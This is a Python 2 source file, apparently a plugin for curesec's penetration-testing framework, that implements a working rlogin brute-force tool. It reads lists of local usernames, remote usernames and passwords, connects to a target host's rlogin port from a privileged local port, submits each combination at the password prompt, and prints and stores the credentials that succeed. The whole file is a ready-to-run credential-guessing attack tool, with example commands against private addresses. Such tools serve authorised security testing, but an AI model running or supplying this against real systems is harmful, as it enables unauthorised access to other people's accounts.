#!/usr/bin/env python2

# Copyright (c) 2014, curesec GmbH
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of
# conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list
# of conditions and the following disclaimer in the documentation and/or other materials
# provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used
# to endorse or promote products derived from this software without specific prior written
# permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
# OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
# TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
from __future__ import with_statement
import sys
import logging
import socket
import argparse
import time
import ccdClasses as ccd
import __builtin__


__version__ = 0.1
__author__ = 'curesec'
__plgname__ = "rlogin_bruteforce"


# logging
LOG = "/tmp/rlogin_bruteforce.log"
FORMAT = '%(asctime)s - %(name)s - ' + \
    '%(levelname)s - %(threadName)s - %(message)s'
logging.basicConfig(filename=LOG,
                    filemode="w",
                    format=FORMAT,
                    level=logging.DEBUG)

logger = logging.getLogger(__name__)
logger.setLevel(logging.WARNING)


class RLoginBruteForcer(object):
    def __init__(self,
                 host,
                 rport,
                 lport,
                 mode,
                 userfile1,
                 userfile2,
                 passwordfile,
                 timeout,
                 verbose,
                 dbh=None):
        self.host = host
        self.rport = int(rport)
        self.lport = int(lport)
        self.mode = mode
        self.userfile1 = userfile1
        self.userfile2 = userfile2
        self.passwordfile = passwordfile
        self.timeout = int(timeout)
        self.verbose = verbose
        self.countall = 0
        self.countsuccess = 0
        self.dbh = dbh

    def run(self):
        print("Starting rlogin brute force...")
        # create threads

        f1 = __builtin__.openany(self.userfile1, "r")
        for username in f1.readlines():
            username = username.strip()
            if self.mode == "singlemode":
                self.runsinglemode(username)
            else:
                self.runmultimode(username)
        f1.close()

    def runsinglemode(self, username):
        if self.passwordfile:
            self.runrloginpassword(username, username)
        else:
            self.testrlogin(username, username, None)

    def runmultimode(self, localusername):
        f2 = __builtin__.openany(self.userfile2, "r")
        for remoteusername in f2.readlines():
            remoteusername = remoteusername.strip()
            if self.passwordfile:
                self.runrloginpassword(localusername, remoteusername)
            else:
                self.testrlogin(localusername, remoteusername, None)

    def runrloginpassword(self, localusername, remoteusername):
        f3 = __builtin__.openany(self.passwordfile, "r")
        for password in f3.readlines():
            password = password.strip()
            self.testrlogin(localusername, remoteusername, password)

    def testrlogin(self, localusername, remoteusername, password):
        sock = None
        status = False
        if password:
            print("Trying: " + localusername + " - " + remoteusername + " - " + password)
        else:
            print("Trying: " + localusername + " - " + remoteusername)
        try:
            sock = createsocket(self.host, self.lport, self.rport, self.timeout)
            # maybe better send "...xterm/38400\x00"?
            sock.send("\x00" + localusername + "\x00" + remoteusername + "\x00xterm\x00")
            text = ""
            ispasswordsent = False
            while True:
                data = sock.recv(1024)
                if not data:
                    break
                text = text + data
                #print("Data: " + data)
                if "Password:" in data:
                    if password:
                        if ispasswordsent:
                            # 2nd password prompt. First one must have failed.
                            if self.verbose:
                                print("Wrong password")
                            break
                        else:
                            sock.send(password + "\r")
                            ispasswordsent = True
                    else:
                        if self.verbose:
                            print("Password required")
                        break
                elif "Last login" in data:
                    if ispasswordsent:
                        print("SUCCESS: " + localusername + " - " + remoteusername + " - " + password)
                        status = True
                    else:
                        print("SUCCESS: " + localusername + " - " + remoteusername + " - [no password]")
                        status = True
                    break
            text = text.strip()
            if self.verbose:
                print("Received output: " + text)

        except socket.error as e:
            print("socket.error: " + str(e))
        finally:
            if sock:
                sock.close()

        if status:
            if status and self.dbh:
                # now, store result entry in data
                self.dbh.add(ccd.RloginBruteforceResult(
                    host=self.host,
                    lport=self.lport,
                    rport=self.rport,
                    localusername=localusername,
                    remoteusername=remoteusername,
                    password=password
                ))

        # sleep a while to prevent errors "Cannot assign requested address" and "Connection refused"
        time.sleep(0.1)


def createsocket(host, lport, rport, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # to avoid "Address already in use"
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(timeout)
        s.bind(("0.0.0.0", int(lport)))
        s.connect((host, int(rport)))
        return s
    except Exception as e:
        logger.exception(e)
        print 'Error creating socket'
        sys.exit(1)


def parse_and_run(args, dbh=None):
    description = "### rlogin Brute Forcer ###\n" +\
        "Run with root privileges as we must bind a local port between 513 and 1023.\n" +\
        "Authentication is based on the source ip address, the local user and the remote user. For rlogin, a password might be required.\n" +\
        "In singlemode, local users and remote users are the same. Only one list is required for singlemode. Usernames are separated by newlines.\n" +\
        "In multimode, there are two separate lists for local users and remote users. All combinations are tested.\n" +\
        "For rlogin: \"SUCCESS: [localuser] - [remoteuser] - [password]\"\n\n" +\
        "examples:\n" +\
        "exec rlogin_bruteforcer.plg -host 192.168.1.20 -mode singlemode -userfile users.txt\n" +\
        "exec rlogin_bruteforcer.plg -host 193.168.1.20 -mode singlemode -userfile users.txt -passwordfile passwords.txt"

    parser = argparse.ArgumentParser(
        prog=__plgname__,
        description=description,
        formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-host",
                        action="store",
                        dest="host",
                        required=True,
                        help="host name or IP address")
    parser.add_argument("-rport",
                        action="store",
                        default=513,
                        dest="rport",
                        required=False,
                        type=int,
                        help="default: 513")
    parser.add_argument("-lport",
                        action="store",
                        dest="lport",
                        default=1023,
                        type=int,
                        required=False,
                        help="must be between 513 and 1023. Default: 1023")
    parser.add_argument('-mode',
                        action="store",
                        dest="mode",
                        required=True,
                        help="choose singlemode or multimode")
    parser.add_argument('-userfile',
                        action="store",
                        dest="userfile1",
                        required=True,
                        help="list containing usernames")
    parser.add_argument('-remoteuserfile',
                        action="store",
                        dest="userfile2",
                        required=False,
                        help="required for multimode")
    parser.add_argument('-passwordfile',
                        action="store",
                        dest="passwordfile",
                        required=False,
                        help="optional for rlogin")
    parser.add_argument("-timeout",
                        action="store",
                        dest="timeout",
                        default=5,
                        type=int,
                        required=False,
                        help="in seconds. Default: 5")
    parser.add_argument("-v",
                        action="store_true",
                        dest="verbose",
                        required=False,
                        help="verbose")

    if not args:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args(args)

    rshbruteforcer = RLoginBruteForcer(args.host,
                                       args.rport,
                                       args.lport,
                                       args.mode,
                                       args.userfile1,
                                       args.userfile2,
                                       args.passwordfile,
                                       args.timeout,
                                       args.verbose,
                                       dbh)

    rshbruteforcer.run()


if __name__ == '__main__':
    parse_and_run(sys.argv[1:])
